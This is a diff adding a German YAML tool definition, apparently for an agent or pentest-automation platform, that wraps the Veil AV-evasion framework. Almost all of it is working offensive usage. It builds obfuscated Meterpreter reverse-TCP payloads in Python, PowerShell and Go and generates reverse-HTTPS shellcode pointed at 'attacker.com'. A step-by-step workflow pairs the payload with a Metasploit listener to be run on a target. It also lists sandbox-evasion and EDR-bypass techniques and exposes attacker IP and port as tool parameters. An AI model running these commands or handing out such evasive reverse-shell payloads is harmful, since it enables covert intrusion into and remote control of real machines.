@@ -1,0 +1,111 @@
+name: "veil"
+command: "veil"
+enabled: true
+short_description: "Veil Framework – AV-Evasion & Payload-Obfuskation"
+description: |
+  Veil ist ein Framework zur Erstellung von AV-umgehenden Payloads.
+  Unterstützt Python, PowerShell, Ruby, Go und weitere Sprachen zur Payload-Generierung.
+  Evasion-Modul erstellt verschleierte Shellcode-Dropper.
+
+  **Hauptmodule:**
+  - **Evasion**: AV-umgehende Payload-Binaries generieren
+  - **Ordnance**: Shellcode für Payloads generieren
+
+  **Evasion-Payloads (wichtigste):**
+  ```bash
+  # Interaktiv starten
+  veil
+
+  # Direkt mit Payload
+  veil -t Evasion -p python/meterpreter/rev_tcp --ip 192.168.1.10 --port 4444 -o payload
+
+  # PowerShell Payload
+  veil -t Evasion -p powershell/meterpreter/rev_tcp --ip 192.168.1.10 --port 4444
+
+  # Go-basierter Payload (niedrige AV-Erkennungsrate)
+  veil -t Evasion -p go/meterpreter/rev_tcp.py --ip 192.168.1.10 --port 4444
+
+  # Custom Shellcode einbetten
+  veil -t Evasion -p python/shellcode_inject/flat.py --ip 192.168.1.10 --port 4444
+  ```
+
+  **Ordnance (Shellcode-Generator):**
+  ```bash
+  # Reverse TCP Shellcode
+  veil -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.10 --port 4444 -o shellcode
+
+  # Reverse HTTPS
+  veil -t Ordnance --ordnance-payload rev_https --ip attacker.com --port 443
+  ```
+
+  **Typischer Workflow:**
+  ```bash
+  # 1. Payload generieren
+  veil -t Evasion -p go/meterpreter/rev_tcp.py --ip 192.168.1.10 --port 4444 -o beacon
+
+  # 2. Metasploit-Listener einrichten
+  msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.10; set LPORT 4444; run"
+
+  # 3. Payload auf Ziel transferieren und ausführen
+  ```
+
+  **Erkennungsumgehungs-Techniken:**
+  - Shellcode-Verschlüsselung (XOR, RC4, AES)
+  - Polymorphe Code-Generierung
+  - Anti-Sandbox-Checks
+  - Sleep/Delay-Techniken
+  - In-Memory-Execution
+
+  **Verwendungsszenarien:**
+  - Initial Access gegen gesicherte Endpoints
+  - AV/EDR-Bypass bei Payload-Delivery
+  - Red Team Engagements mit modernen Endpoint-Security
+
+  **Hinweise:**
+  - Veil-Evasion-Pfad: /opt/veil/Veil.py
+  - Output-Verzeichnis: /var/lib/veil/output/
+  - Nur für autorisierte Sicherheitstests
+parameters:
+  - name: "tool"
+    type: "string"
+    description: "Veil-Tool (Evasion oder Ordnance)"
+    required: true
+    flag: "-t"
+    format: "flag"
+  - name: "payload"
+    type: "string"
+    description: |
+      Payload-Typ, z.B.:
+      - `python/meterpreter/rev_tcp`
+      - `go/meterpreter/rev_tcp.py`
+      - `powershell/meterpreter/rev_tcp`
+      - `cs/meterpreter/rev_tcp.py`
+    required: true
+    flag: "-p"
+    format: "flag"
+  - name: "lhost"
+    type: "string"
+    description: "Angreifer-IP für Reverse-Verbindung"
+    required: true
+    flag: "--ip"
+    format: "flag"
+  - name: "lport"
+    type: "int"
+    description: "Angreifer-Port für Reverse-Verbindung"
+    required: true
+    flag: "--port"
+    format: "flag"
+  - name: "output"
+    type: "string"
+    description: "Output-Dateiname (ohne Erweiterung)"
+    required: false
+    default: "payload"
+    flag: "-o"
+    format: "flag"
+  - name: "additional_args"
+    type: "string"
+    description: "Weitere Veil-Argumente"
+    required: false
+    default: ""
+    position: 0
+    format: "positional"
